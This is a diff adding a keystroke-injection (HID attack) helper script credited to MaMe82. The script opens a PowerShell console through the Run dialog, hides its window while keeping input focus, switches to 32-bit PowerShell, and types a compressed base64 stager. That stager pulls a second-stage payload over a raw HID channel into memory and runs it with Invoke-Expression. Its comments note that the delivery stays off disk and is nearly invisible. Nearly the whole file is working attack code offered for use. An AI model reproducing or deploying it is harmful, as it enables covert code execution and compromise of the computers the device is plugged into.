@@ -1,0 +1,65 @@
+/*
+Common helper methods for HID attacks
+author: MaMe82
+*/
+
+ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
+ps="powershell.exe"
+
+// sets typing speed to "natural" (global effect on all running script jobs)
+function natural() {
+  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
+}
+
+// sets typing speed as fast as possible
+function fast() {
+  typingSpeed(0,0)
+}
+
+// Open an interactive PowerShell console (host architecture)
+function startPS() {
+	press("GUI r");
+	delay(500);
+	type("powershell\n")
+}
+
+// Hide an already opened PowerShell console, but keep input focus, to gon on typing
+function hidePS() {
+	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
+  	press("ENTER");
+}
+
+// On a powershell prompt, check if the running PS is 32bit, start an inline 32bit PowerShell, otherwise.
+function assurePS32() {
+  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
+  delay(500);
+}
+
+// Streams PS code via a HID channel into memory and executes the received result with IEX.
+// The second stage code has to be provided by hidstager.py.
+// PID and VID in used by the raw HID device have to be provided as string arguments in format "1D6B", "4137".
+//
+// The advantages of delivery via raw HID:
+// - the channel allows to transfer large payloads silently (about 32KByte/s on USB 2.0)
+// - the payload goes to memory, not to disk
+// - combined with hidePS, typing out his stager could be done nearly invisible (2131 characters have to be typed here)
+// The disadvantages of delivery via raw HID:
+// - the payload is executed with Invoke-Expression (iex) after transfer, which is 'loud' again
+// - the PID and VID of the (raw) HID device in use have to be known, in order to allow the stager to identify the device
+//   (the stager manages to find the correct interface itself, if multiple HID interfaces, like keyboard and mouse, are up)
+function hidDownAndIEX(vid, pid) {
+  type("$USB_VID='"+ vid +"';$USB_PID='" + pid +"';");
+  type("$b='"+stage1+"';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()");
+  press("ENTER");
+}
+
+layout('us');			// US keyboard layout
+fast();
+
+startPS();
+delay(500);
+assurePS32();
+delay(500);
+//hidePS();
+//delay(500);
+hidDownAndIEX("1D6B", "1347");
